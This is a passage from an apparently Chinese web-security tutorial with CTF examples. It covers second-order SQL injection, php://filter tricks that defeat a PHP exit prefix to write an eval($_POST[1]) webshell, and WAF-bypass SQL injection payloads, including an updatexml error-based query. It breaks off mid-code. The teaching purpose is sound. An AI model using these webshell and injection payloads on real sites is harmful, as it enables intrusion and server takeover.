&lt;p&gt;因此我们在 confirm.php 插入数据库中时，提交注入语句&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190851989.png&#34; alt=&#34;image-20221023190851989&#34;&gt;&lt;/p&gt;
&lt;p&gt;在修改地址时二次引用&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190938216.png&#34; alt=&#34;image-20221023190938216&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190949077.png&#34; alt=&#34;image-20221023190949077&#34;&gt;&lt;/p&gt;
&lt;p&gt;因为不是 ctf 教程，所以为什么 flag 在 flag.txt，flag.txt 为什么在根下就不赘述了&lt;/p&gt;
&lt;p&gt;[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)&lt;/p&gt;
&lt;p&gt;然后接下来带来一些花活：&lt;/p&gt;
&lt;h6 id=&#34;php-exit-绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-exit-绕过&#34;&gt;#&lt;/a&gt;  &lt;code&gt;&amp;lt;?php exit; ?&amp;gt;&lt;/code&gt;  绕过&lt;/h6&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$content = &amp;#x27;&amp;lt;?php exit; ?&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$content .= $_POST[&amp;#x27;txt&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_put_contents($_POST[&amp;#x27;filename&amp;#x27;], $content);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;$content 在开头增加了 exit 过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上 if (!defined (xxx)) exit; 之类的限制）&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mtext&gt;是可以控制协议的，我们即可使用&lt;/mtext&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;协议&lt;/mtext&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;流的&lt;/mtext&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mn&gt;64&lt;/mn&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;方法，将&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_POST[&amp;#x27;filename&amp;#x27;]是可以控制协议的，我们即可使用 php://filter协议,php://filter流的base64-decode方法，将&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.001892em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05764em;&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;可&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;以&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;控&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;制&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;协&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;议&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;我&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;们&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;即&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;可&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;使&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;用&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;协&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;议&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;流&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;的&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;方&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;法&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;将&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; content 解码，利用 php base64_decode 函数特性去除 “死亡 exit”。&lt;/p&gt;
&lt;p&gt;因此我们可以找到两种 base64-decode 相关的绕过&lt;/p&gt;
&lt;p&gt;0x00 通过 base64 编码特性绕过&lt;/p&gt;
&lt;p&gt;base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。&lt;/p&gt;
&lt;p&gt;所以，当 $content 被加上了 &lt;code&gt;&amp;lt;?php exit; ?&amp;gt;&lt;/code&gt;  以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。由于该语句中只有 phpexit 符合 base64 解码特性，因此其余的符号会被忽略。&lt;/p&gt;
&lt;p&gt;“phpexit” 一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个 “a” 一共 8 个字符。后面在拼接我们一句话木马的 base64 编码格式。这样在解码的时候 phpexita 会被解码为无用字符，我们的一句话木马被正常解码&lt;/p&gt;
&lt;p&gt;因此我们最终传入的 payload 为：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;amp;filename=php://filter/read=convert.base64-decode/resource=aaa.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在 filename 解码时，a 和 phpexit 变为了乱码，我们的 eval ($_POST [1]) 最终留了下来&lt;/p&gt;
&lt;p&gt;0x01 利用字符串操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;?php exit; ?&amp;gt;&lt;/code&gt;  实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。&lt;/p&gt;
&lt;p&gt;利用如下 payload，我们便能去除 &amp;lt;&amp;gt; 中的内容  &lt;code&gt;php://filter/read=string.strip_tags/resource=php://input&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但问题在于，如果我们去除 &amp;lt;&amp;gt; 会导致我们的一句话木马也被去除。&lt;/p&gt;
&lt;p&gt;但 php://filter 允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 strip_tags 后再进行 base64-decode。&lt;/p&gt;
&lt;p&gt;最终 payload 如下&lt;/p&gt;
&lt;p&gt;&lt;code&gt;txt=PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;amp;filename=php://filter/write=string.strip_tags | convert.base64-decode/resource=aaa.php&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;filename 中的 string.strip_tags 先把 exit 的 &amp;lt;&amp;gt; 去除，在把我们提交的 base64 编码解码，最终只剩下 &lt;code&gt;&amp;lt;?php eval($_POST[1];?)&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;带有waf过滤的sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#带有waf过滤的sql注入&#34;&gt;#&lt;/a&gt; 带有 WAF 过滤的 SQL 注入&lt;/h5&gt;
&lt;p&gt;1. 过滤 and、or&lt;/p&gt;
&lt;p&gt;在过滤一遍的场景下可以尝试双写，大小写  less25，26&lt;/p&gt;
&lt;p&gt;在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。&lt;/p&gt;
&lt;p&gt;或者使用逻辑运算符，使用 || 代替 or，&amp;amp;&amp;amp; 代替 and，但需要对 &amp;amp;&amp;amp; 进行编码 %26%26，URLcode 不用对 || 编码&lt;/p&gt;
&lt;p&gt;2. 过滤空格&lt;/p&gt;
&lt;p&gt;使用 /**/ 多行注释代替  Less 26&lt;/p&gt;
&lt;p&gt;%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)&lt;/p&gt;
&lt;p&gt;使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?username=admin&amp;amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3. 过滤注释&lt;/p&gt;
&lt;p&gt;如果用单引号闭合，使用 and’1’=&#39;1 代替注释&lt;/p&gt;
&lt;p&gt;使用；%00 截断&lt;/p&gt;
&lt;p&gt;4.union select 过滤&lt;/p&gt;
&lt;p&gt;uniunion selecton select&lt;/p&gt;
&lt;p&gt;5. 过滤 =&lt;/p&gt;
&lt;p&gt;like&lt;/p&gt;
&lt;p&gt;regexp&lt;/p&gt;
&lt;p&gt;6.0x 通过 16 进制逃过&lt;/p&gt;
&lt;h5 id=&#34;通过编码注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#通过编码注入&#34;&gt;#&lt;/a&gt; 通过编码注入&lt;/h5&gt;
&lt;ol&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一些 mysql 不认识，但 php 认识的字符，只限制于 post&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;]) &amp;amp;&amp;amp; &lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ps&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_connect&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;root&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;root123&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_select_db&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;adog&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;set names utf8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_real_escape_string&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$ps&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_real_escape_string&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;trim&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ps&amp;#x27;&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_fetch_array&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;select * from users where id=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$id&lt;/span&gt;&amp;#x27; and ps=&amp;#x27;&lt;span class=&#34;subst&#34;&gt;$ps&lt;/span&gt;&amp;#x27;&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$row&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;adog&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;shabi&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;flag&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;wrong&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    